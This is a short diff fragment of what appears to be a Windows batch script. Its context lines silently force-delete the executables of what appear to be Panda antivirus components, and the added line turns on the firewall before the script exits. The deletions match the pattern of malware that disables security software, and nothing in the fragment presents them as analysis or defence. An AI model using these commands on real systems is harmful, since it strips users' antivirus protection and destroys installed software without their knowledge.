@@ -122,4 +122,5 @@ cls
 del /Q /F C:\Program Files\apvxdwin\*.exe
 del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\pandasoftware\*.*
+netsh firewall set opmode mode=enable
 exit
